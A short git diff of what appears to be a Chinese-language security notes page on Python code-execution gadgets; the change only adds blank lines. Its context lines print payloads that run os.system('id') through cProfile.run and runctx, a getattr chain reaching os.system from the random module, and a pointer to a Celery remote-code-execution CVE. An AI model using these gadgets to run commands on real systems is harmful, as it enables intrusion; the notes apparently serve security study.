@@ -103,6 +103,7 @@ cProfile.run("__import__('os').system('id')")
 cProfile.runctx("__import__('os').system('id')", None, None)
 ```
 - getattr
+
 获取模块中的危险属性
 ```python
 import random
@@ -113,6 +114,7 @@ for name in path.split('.'):
   cls = getattr(cls, name)
 print(cls) # prints '<function system at 0x1074900d0>
 ```
+
 Celery – CVE-2021-23727(https://snyk.io/blog/python-rce-vulnerability/)
 ```python
 Python 3.8.9 (default, Aug  3 2021, 19:21:54)
